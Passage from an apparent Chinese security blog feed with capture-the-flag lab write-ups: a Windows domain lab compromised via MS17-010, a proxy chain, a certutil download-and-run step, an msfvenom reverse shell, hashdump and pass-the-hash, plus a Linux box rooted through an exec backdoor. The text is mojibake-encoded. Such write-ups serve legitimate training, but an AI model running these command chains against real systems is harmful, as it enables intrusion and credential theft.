[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:445
[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:389
[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:139
[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:139
[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:139
[2025-08-12 07:42:26] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:3306
[2025-08-12 07:42:26] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:3306 => [mysql] äº§å“:MySQL ä¿¡æ¯:unauthorized Banner:[H.j Host 'WIN-KOHRC1DGOL9' is not allowed
to connect to this MySQL server]
[2025-08-12 07:42:27] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:88 => 
[2025-08-12 07:42:30] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:80 => [http]
[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:445 => 
[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:139 =>  Banner:[.]
[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:139 =>  Banner:[.]
[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:445 => 
[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:139 =>  Banner:[.]
[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:445 => 
[2025-08-12 07:42:36] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:389 => 
[2025-08-12 07:43:27] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:135 => 
[2025-08-12 07:43:27] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:135 => 
[2025-08-12 07:43:27] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:135 => 
[2025-08-12 07:43:27] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 13
[2025-08-12 07:43:27] [INFO] å¼€å§‹æ¼æ´æ‰«æ
[2025-08-12 07:43:27] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle
[2025-08-12 07:43:27] [SUCCESS] NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: 192.168.20.10
ä¸»æœºå: WIN-KOHRC1DGOL9
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ 192.168.10.10
[2025-08-12 07:43:27] [SUCCESS] NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: 192.168.20.20
ä¸»æœºå: cyberweb
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ 192.168.20.20
[2025-08-12 07:43:27] [SUCCESS] å‘ç°æ¼æ´ 192.168.20.20 [Windows Server 2012 R2 Standard 9600] MS17-010
[2025-08-12 07:43:27] [SUCCESS] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600
[2025-08-12 07:43:27] [SUCCESS] å‘ç°æ¼æ´ 192.168.20.30 [Windows Server 2008 R2 Standard 7600] MS17-010
[2025-08-12 07:43:27] [SUCCESS] NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: 192.168.20.30
ä¸»æœºå: WIN-7NRTJO59O7N
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ 192.168.20.30
[2025-08-12 07:43:28] [SUCCESS] NetBios 192.168.20.10   WORKGROUP\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600
[2025-08-12 07:43:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://192.168.20.10      çŠ¶æ€ç :200 é•¿åº¦:25229  æ ‡é¢˜:æ˜“ä¼˜CMS -  Powered by Eyoucms.com
[2025-08-12 07:43:40] [SUCCESS] ç›®æ ‡: http://192.168.20.10:80
  æ¼æ´ç±»å‹: poc-yaml-thinkphp5023-method-rce
  æ¼æ´åç§°: poc1
  è¯¦ç»†ä¿¡æ¯:
        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
```

`192.168.20.20` å’Œ `30` å‘ç°æ°¸æ’ä¹‹è“

## 192.168.20.20 - 1

æ‰“æ°¸æ’ä¹‹è“éœ€è¦æ­ä»£ç†

è¿™é‡Œä½¿ç”¨ `stowaway`

```php
./linux_x64_admin -l 8000 -s 123

Start-Process -FilePath "C:\agent.exe" -ArgumentList "-c 172.16.233.2:8000 -s 123 --reconnect 8"
```

```php
(admin) >> use 0
(node 0) >> socks 4444 admin admin
[*] Trying to listen on 0.0.0.0:4444......
[*] Waiting for agent's response......
[*] Socks start successfully!
```

è®¾ç½®å¥½ä»£ç†åç”¨ `MSF` æ‰“æ°¸æ’ä¹‹è“

```php
âœ  Lab1 proxychains -q msfconsole
search ms17_010
use 19
set command whoami
set rhost 192.168.20.20
run
```

ä½†æ˜¯è¿™é‡Œåº”è¯¥æ˜¯è¢«ä¿®å¤äº†ï¼Œå…ˆæ”¾ç€

```php
msf6 auxiliary(admin/smb/ms17_010_command) > exploit

[*] 192.168.20.20:445     - Target OS: Windows Server 2012 R2 Standard 9600
[-] 192.168.20.20:445     - Unable to find accessible named pipe!
[*] 192.168.20.20:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## 192.168.20.30

è½¬æ¢ç›®æ ‡ï¼Œæ‰“ `192.168.20.30`

```php
msf6 auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.20.30
rhost => 192.168.20.30
msf6 auxiliary(admin/smb/ms17_010_command) > set command whoami
command => whoami
msf6 auxiliary(admin/smb/ms17_010_command) > run
[*] 192.168.20.30:445     - Target OS: Windows Server 2008 R2 Standard 7600
[*] 192.168.20.30:445     - Built a write-what-where primitive...
[+] 192.168.20.30:445     - Overwrite complete... SYSTEM session obtained!
[+] 192.168.20.30:445     - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.20.30:445     - Getting the command output...
[*] 192.168.20.30:445     - Executing cleanup...
[+] 192.168.20.30:445     - Cleanup was successful
[+] 192.168.20.30:445     - Command completed successfully!
[*] 192.168.20.30:445     - Output for "whoami":

nt authority\system

[*] 192.168.20.30:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

æˆåŠŸæ‰§è¡Œï¼Œå‡†å¤‡ä¸Šçº¿ `Vshell` 

é€šè¿‡ `stowaway` å°†ç›‘å¬ç«¯å£æ˜ å°„åˆ° `192.168.20.10`

```php
(node 0) >> backward 1234 1234
[*] Trying to ask node to listen on 0.0.0.0:1234......
[*] Waiting for agent's response......
[*] Backward start successfully!
```

é€šè¿‡ `ms17_010` è¿›è¡Œä¸Šçº¿

```php
set command "certutil.exe -urlcache -split -f http://192.168.20.10:1234/swt C:\\run.bat"
run
set command "start C:\\run.bat"
run
```

![image.png](/post-images/CyberstrikelabLab-1/image7.png)

`C` ç›˜æ ¹ç›®å½•èƒ½æ‰¾åˆ°ç¬¬äºŒä¸ª `flag`

```php
go-flag{R0M4QwsS6EQp97lw}
```

å…³é—­é˜²ç«å¢™å’Œå¼€å¯è¿œç¨‹æ¡Œé¢

```php
C:\Windows\system32>netsh advfirewall set allprofiles state off
ç¡®å®šã€‚

C:\Windows\system32>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
æ“ä½œæˆåŠŸå®Œæˆã€‚
```

ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°è¯¥æœºå™¨å°±æ˜¯ DC

```php
C:\Windows\system32>net view
æœåŠ¡å™¨åç§°            æ³¨è§£

-------------------------------------------------------------------------------
\\CYBERWEB
\\WIN-7NRTJO59O7N
å‘½ä»¤æˆåŠŸå®Œæˆã€‚

PS C:\> net view /domain
Domain

-------------------------------------------------------------------------------
CYBERSTRIKELAB
å‘½ä»¤æˆåŠŸå®Œæˆã€‚

C:\Windows\system32>net view /domain
Domain

-------------------------------------------------------------------------------
CYBERSTRIKELAB
å‘½ä»¤æˆåŠŸå®Œæˆã€‚

C:\Windows\system32>net group "domain controllers"
ç»„å     Domain Controllers
æ³¨é‡Š     åŸŸä¸­æ‰€æœ‰åŸŸæ§åˆ¶å™¨

æˆå‘˜

-------------------------------------------------------------------------------
WIN-7NRTJO59O7N$
```

ä¸Šçº¿ `MSF` ï¼Œå’Œä¸Šé¢ä¸Šçº¿ `Vshell`çš„æ“ä½œç±»ä¼¼

```php
(node 0) >> backward 9009 9009
[*] Trying to ask node to listen on 0.0.0.0:9009......
[*] Waiting for agent's response......
[*] Backward start successfully!
```

```php
msf6 exploit(multi/handler) > set lport 9009
lport => 9009
msf6 exploit(multi/handler) > options

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
   LPORT     9009             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:9009 
```

```php
âœ  Lab1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.10 LPORT=9009 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

å°† `shell.exe` ä¸Šä¼ åˆ° `192.168.20.30` ï¼Œç„¶åè¿è¡Œ

![image.png](/post-images/CyberstrikelabLab-1/image8.png)

æŠ“å– `hash`

```php
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::
cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::
WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:f056ff4d1ad036e570c5344bb3d4e65c:::
CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:c9f108dc7ba78e084283c00e33dffeff:::
```

## 192.168.20.20

æµ‹è¯•å‡­æ®

```php
âœ  Lab1 proxychains -q nxc smb 192.168.20.20 -u administrator -H 94bd5248e87cb7f2f9b871d40c903927 
SMB         192.168.20.20   445    CYBERWEB         [*] Windows 8.1 / Server 2012 R2 Build 9600 x64 (name:CYBERWEB) (domain:cyberstrikelab.com) (signing:False) (SMBv1:True) 
SMB         192.168.20.20   445    CYBERWEB         [+] cyberstrikelab.com\administrator:94bd5248e87cb7f2f9b871d40c903927 (Pwn3d!)
```

`PTH` æ‹¿ä¸‹

```php
âœ  Lab1 proxychains -q psexec.py cyberstrikelab.com/administrator@cyberweb.cyberstrikelab.com -hashes aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on cyberweb.cyberstrikelab.com.....
[*] Found writable share ADMIN$
[*] Uploading file pqpIKIBX.exe
[*] Opening SVCManager on cyberweb.cyberstrikelab.com.....
[*] Creating service WhKD on cyberweb.cyberstrikelab.com.....
[*] Starting service WhKD.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [ï¿½æ±¾ 6.3.9600]

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
(c) 2013 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½

C:\Windows\system32>
```

è¯»å–ç¬¬ä¸‰ä¸ª `flag`

```php
C:\> type flag.txt
go-flag{Nb8VOT8X9SbIzyDI}
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>Cyberstrikelab</category>
            <category>Windows</category>
            <category>Vshell</category>
            <category>å¤šå±‚å†…ç½‘</category>
            <category>MS17_010</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - ShadowGate]]></title>
            <link>https://www.sunsetaction.top/2025/08/06/TheHackersLabsShadowGate</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/06/TheHackersLabsShadowGate</guid>
            <pubDate>Wed, 06 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[ShadowGate https://labs.thehackerslabs.com/machine/97 Recon PortScan æšä¸¾ 8080 ç«¯å£ æç¤ºé”™è¯¯çš„æ–¹æ³•ï¼Œä½†æ˜¯ä½ æ‰¾åˆ°è·¯å¾„äº† æ”¹ä¸º POST æ–¹æ³•åæç¤º æ²¡æœ‰ä»»ä½•ä¿¡æ¯ï¼Œçœ‹ä¸€ä¸‹å…¶ä»–ç«¯å£ å¥‡æ€ªçš„ 56789 ç«¯å£ï¼Œnc è¯•ä¸€ä¸‹ æš—å½±ä¹‹é—¨...]]></description>
            <content:encoded><![CDATA[
# ShadowGate

> https://labs.thehackerslabs.com/machine/97
> 

![image.png](/post-images/TheHackersLabsShadowGate/image.png)

## Recon

### PortScan

```bash
âœ  ShadowGate nmap -sT -min-rate 10000 -p- 192.168.56.105
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:20 CST
Nmap scan report for 192.168.56.105
Host is up (0.00050s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
8080/tcp  open  http-proxy
56789/tcp open  unknown
MAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 16.41 seconds
```

```bash
âœ  ShadowGate nmap -sT -A -p 22,8080,56789 192.168.56.105
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:21 CST
Nmap scan report for 192.168.56.105
Host is up (0.00047s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 84:05:fe:ed:47:16:ab:28:70:0f:44:6e:f6:8d:0c:6f (ECDSA)
|_  256 99:a9:88:76:ee:c8:ed:ce:73:57:2a:22:da:9f:7b:7e (ED25519)
8080/tcp  open  http       Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-title: 403 Forbidden
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
56789/tcp open  tcpwrapped
MAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms 192.168.56.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.07 seconds
```

### æšä¸¾

 `8080` ç«¯å£

æç¤ºé”™è¯¯çš„æ–¹æ³•ï¼Œä½†æ˜¯ä½ æ‰¾åˆ°è·¯å¾„äº†

![Snipaste_2025-08-05_21-30-52.png](/post-images/TheHackersLabsShadowGate/Snipaste_2025-08-05_21-30-52.png)

æ”¹ä¸º `POST` æ–¹æ³•åæç¤º

![image.png](/post-images/TheHackersLabsShadowGate/image1.png)

æ²¡æœ‰ä»»ä½•ä¿¡æ¯ï¼Œçœ‹ä¸€ä¸‹å…¶ä»–ç«¯å£

å¥‡æ€ªçš„ `56789` ç«¯å£ï¼Œ`nc` è¯•ä¸€ä¸‹

```bash
âœ  ShadowGate nc 192.168.56.105 56789                 
Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closelyâ€”patterns hide in the noise. Sequence always matters.
Listening... but no response.
```

> æš—å½±ä¹‹é—¨ v1.0 :: å¹¶éæ‰€æœ‰é—¨éƒ½é”ç€ã€‚æœ‰äº›é—¨åœ¨ç­‰å¾…å¤œå¹•é™ä¸´ã€‚ä»”ç»†è†å¬â€”â€”å™ªéŸ³ä¸­éšè—ç€è§„å¾‹ã€‚é¡ºåºæ€»æ˜¯å¾ˆé‡è¦ã€‚
è†å¬â€¦â€¦ä½†æ²¡æœ‰å›åº”ã€‚
> 

çœ‹ç€åƒæ˜¯è¦å‘é‡Œè¾¹æŒ‰é¡ºåºè¾“å…¥ä¸€ä¸‹ä¸œè¥¿

## 56789

å½“æˆ‘ä»¬è¾“å…¥ `n0cturne` æ—¶ï¼Œä¼šå‡ºç°å¥½å‡ ä¸² `base64` åŠ å¯†åçš„å­—ç¬¦

![image.png](/post-images/TheHackersLabsShadowGate/image2.png)

å¹¶ä¸”é‡æ–°è¾“å…¥ç”Ÿæˆçš„è¿˜æ˜¯ä¸ä¸€æ ·çš„

![image.png](/post-images/TheHackersLabsShadowGate/image3.png)

æ ¹æ®ç‰¹å¾ï¼Œè§£å¯†åå¾—åˆ° 16å­—èŠ‚ = 128ä½ã€‚è¿™æ˜¯ç°ä»£åˆ†ç»„å¯†ç ï¼ˆå¦‚ `AES-128`ï¼‰æœ€å¸¸è§çš„å—å¤§å°ï¼ˆBlock Sizeï¼‰

```bash
// ç¬¬ä¸€æ¬¡ç”Ÿæˆ
YzRmN2QzNQ==
MwaB7TbchXxNQQwID9JXIg==
7+ptCEtXTcCFo8dVwYrIEw==
YAgEH6bP+PPY4VyD80z7sg==
a+T5dxugIDfFykgQi71Eag==
fGMHS36e74T+cALZURlj8g==
ez4fog9UnAeemGETp6K2Aw==
XZSJq2YIk3v/GM9R/NPa9w==
sh6KfrTKDXndFadgySlIhA==

// ç¬¬äºŒæ¬¡ç”Ÿæˆ
YzRmN2QzNQ==
5/moJpOc9OpfYOHR6jl+bA==
GWxuKkuzPn0t4aTSO0livQ==
E2QIRlxnY+gWfTlVUcm4LA==
Yu9ChnO4fJxbMPPGbN04ug==
NdNO8rDcGcLah47kqmnKBA==
gFpBAQKKx1QDMNw60GkiwA==
4eL9754ZX/qQYUk4s6Q9SA==
Mxte5TYR9OIZuzOmQDWAYg==
```

ç¬¬ä¸€è¡Œè§£ç ä¸ºï¼š`YzRmN2QzNQ==` >`c4f7d35`

è¿™é‡Œå› ä¸ºæˆ‘å¯¹å¯†ç å­¦ä¸ç†Ÿï¼ŒæŸ¥é˜…äº†ä¸€ä¸‹ `WP`

ç¬¬ä¸€ä¸²ç¼–ç åº”è¯¥æ˜¯å¯†é’¥

```bash
(more) âœ  ShadowGate echo -n "c4f7d35" | sha256sum
7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75  -
```

ç„¶ååœ¨ `cyberchef` è¿›è¡Œè§£å¯†ï¼Œå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“ `IV` ä»¥åŠåŠ å¯†æ¨¡å¼ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥è¿›è¡Œæµ‹è¯•ä¸€ä¸‹ï¼Œæœ€åå¯ä»¥ä½¿ç”¨ `ECB/NoPadding` è¿›è¡Œè§£å¯†

è§£å¯†ç¬¬ä¸€æ¬¡çš„å¯†æ–‡

![image.png](/post-images/TheHackersLabsShadowGate/image4.png)

è§£å¯†ç¬¬äºŒæ¬¡çš„å¯†æ–‡

![image.png](/post-images/TheHackersLabsShadowGate/image5.png)

å¯ä»¥å‘ç°æ¯ä¸€æ®µå¯†æ–‡çš„ç¬¬ä¸€ä¸ªå­—ç¬¦éƒ½æ˜¯ä¸€æ ·çš„ï¼Œèƒ½æ‹¿åˆ° `v4u1tgx9`

## 8080

æ‹¿åˆ° `v4u1tgx9` ä¹‹åï¼Œæˆ‘ä»¬åº”è¯¥å¯ä»¥å¯¹ `8080` è¿›è¡Œæµ‹è¯•äº†

è¾“å…¥ `username`

![image.png](/post-images/TheHackersLabsShadowGate/image6.png)

> ä»¤ç‰Œå·²æ´¾å‡ºã€‚ä½ åªéœ€è¦â€¦â€¦ä¾§èº«çœ‹ã€‚
> 

æç¤ºç¼ºå°‘ `Token` ï¼Œå¹¶ä¸”è¿˜çœ‹åˆ°ç›¸åº”ä¿ä¸­å¸¦æœ‰ `MFA`ï¼ˆåŒé‡è®¤è¯ï¼‰ï¼Œæ˜¯åŸºäºæ—¶é—´ç”Ÿæˆçš„ `TOTP` ä¸€æ¬¡æ€§å£ä»¤ï¼Œæ— æ³•ç›´æ¥çˆ†ç ´

å¯¹ç›®å½•è¿›è¡Œçˆ†ç ´ï¼Œå°è¯•å¯»æ‰¾æ›´å¤šæ¥å£

```bash
âœ  ShadowGate ffuf -u 'http://192.168.56.105:8080/FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -fc 404,403 -X POST -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.56.105:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,403
________________________________________________

login                   [Status: 200, Size: 48, Words: 8, Lines: 1, Duration: 72ms]
verify                  [Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 85ms]
```

æ‰¾åˆ° `verify` çš„ç«¯ç‚¹ï¼Œè¿›è¡Œæµ‹è¯•ï¼Œæ‰€ä»¥ `login`æ˜¯ç¬¬ä¸€å±‚è®¤è¯ï¼Œ`verify` æ˜¯ç¬¬äºŒå±‚è®¤è¯

å°†ç¬¬ä¸€å±‚çš„å“åº”ä¸­çš„ `X-Shadow-MFA: 286346` æ”¾åˆ° `verify`ä¸­

![image.png](/post-images/TheHackersLabsShadowGate/image7.png)

æ·»åŠ åæç¤ºï¼šâ€ æ‰¿è®¤ã€‚ä¸»åŠ¨æœåŠ¡ã€‚â€œ

![image.png](/post-images/TheHackersLabsShadowGate/image8.png)

å›åˆ° `56789`ç«¯å£ï¼ŒåŸæœ¬çš„è¡Œä¸ºä¼šè¢«æ”¹å˜

![image.png](/post-images/TheHackersLabsShadowGate/image9.png)

å¾—åˆ°ä¸€ç»„å‡­æ® `mars:sshpassword123`

è¯¥ç”¨æˆ·èƒ½è¯»å– `user.txt`

```bash
mars@TheHackersLabs-Shadowgate:~$ cat user.txt 
acf9xxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## æƒé™æå‡

æŸ¥çœ‹æ­£åœ¨ç›‘å¬ç«¯å£

å­˜åœ¨ä¸€ä¸ªæœ¬åœ°æ‰“å¼€ `4444` ç«¯å£

```bash
mars@TheHackersLabs-Shadowgate:~$ ss -tulpn
Netid          State           Recv-Q          Send-Q                             Local Address:Port                      Peer Address:Port          Process                                    
udp            UNCONN          0               0                                     127.0.0.54:53                             0.0.0.0:*                                                        
udp            UNCONN          0               0                                  127.0.0.53%lo:53                             0.0.0.0:*                                                        
udp            UNCONN          0               0                          192.168.56.105%enp0s3:68                             0.0.0.0:*                                                        
tcp            LISTEN          0               5                                      127.0.0.1:4444                           0.0.0.0:*                                                        
tcp            LISTEN          0               5                                        0.0.0.0:2222                           0.0.0.0:*              users:(("socat",pid=25904,fd=5))          
tcp            LISTEN          0               4096                               127.0.0.53%lo:53                             0.0.0.0:*                                                        
tcp            LISTEN          0               5                                        0.0.0.0:56789                          0.0.0.0:*                                                        
tcp            LISTEN          0               4096                                  127.0.0.54:53                             0.0.0.0:*                                                        
tcp            LISTEN          0               128                                      0.0.0.0:8080                           0.0.0.0:*                                                        
tcp            LISTEN          0               4096                                           *:22                                   *:* 
```

ä½¿ç”¨ `socat` è½¬å‘å‡ºæ¥

```bash
mars@TheHackersLabs-Shadowgate:~$ ./socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:4444 &
```

è¿›è¡Œäº¤äº’

![image.png](/post-images/TheHackersLabsShadowGate/image10.png)

æµ‹è¯•äº†ä¸€ä¸‹æœ‰ç‚¹æ‡µ

åœ¨ `/opt` ä¸­èƒ½æ‰¾åˆ°æºç 

```bash
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ cat shadow-client.py
#!/usr/bin/env python3
import socket
import threading
import io
import contextlib

def handle_client(client_socket):
    client_socket.send(b"Welcome to Shadow Client Helper\n")
    client_socket.send(b"This is an unrestricted environment. Good luck, hacker.\n")
    while True:
        client_socket.send(b">>> ")
        code = client_socket.recv(1024).decode().strip()
        try:
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                exec(code, globals())
            result = output.getvalue()
            if result.strip():
                client_socket.send(result.encode())
        except Exception as e:
            client_socket.send(f"Error: {e}\n".encode())

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 4444))
    server.listen(5)
    while True:
        client, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    main()
```

ç®€å•æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä»»ä½•è¿æ¥åˆ°è¿™ä¸ªæœåŠ¡å™¨çš„å®¢æˆ·ç«¯éƒ½å¯ä»¥æ‰§è¡Œä»»æ„çš„ Python ä»£ç ï¼Œå¹¶è·å–æ‰§è¡Œç»“æœã€‚ è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCE, Remote Code Executionï¼‰çš„åé—¨ç¨‹åºã€‚

è¿™å°±ç®€å•äº†ï¼Œè¾“å…¥

```bash
>>> import os;
>>> os.system("chmod +s /bin/bash")
```

å›åˆ°é¶æœºä¸ŠæŸ¥çœ‹

![image.png](/post-images/TheHackersLabsShadowGate/image11.png)

è¯»å– `root.txt`

```bash
mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ /bin/bash -p
bash-5.2# cd /root
bash-5.2# cat root.txt
437axxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>MFA</category>
            <category>ffuf</category>
            <category>Python</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Code]]></title>
            <link>https://www.sunsetaction.top/2025/08/06/HackTheBoxSeason7-Code</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/06/HackTheBoxSeason7-Code</guid>
            <pubDate>Fri, 04 Apr 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Season7 Code https://app.hackthebox.com/machines/653 | esay å‰æœŸè¸©ç‚¹ å°±æ‰«æå‡ºä¸€ä¸ª22ç«¯å£ï¼Œä¸å¯¹åŠ²ç»§ç»­æ‰« æ–°ç«¯å£æ˜¯ä¸€ä¸ªä»£ç ç¼–è¾‘å™¨Python Code Editor WEB æ¸—é€ å¯ä»¥æ‰§è¡Œpythonå‘½ä»¤ï¼Œé¦–å…ˆå°è¯•ä¸€ä¸‹os åº“ æç¤ºUse ...]]></description>
            <content:encoded><![CDATA[# Season7-Code

> https://app.hackthebox.com/machines/653 | `esay`
> 

## å‰æœŸè¸©ç‚¹

```bash
âš¡ root@kali î‚° ~ î‚° nmap -sT -min-rate 10000 -p- 10.10.11.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:09 EDT
Nmap scan report for 10.10.11.62
Host is up (0.15s latency).
Not shown: 64591 filtered tcp ports (no-response), 943 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 37.29 seconds
```

å°±æ‰«æå‡ºä¸€ä¸ª`22`ç«¯å£ï¼Œä¸å¯¹åŠ²ç»§ç»­æ‰«

```bash
âš¡ root@kali î‚° ~/Desktop/test/Code î‚° nmap -sS -min-rate 10000 -p- 10.10.11.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:34 EDT
Warning: 10.10.11.62 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.62
Host is up (0.84s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 33.23 seconds
```

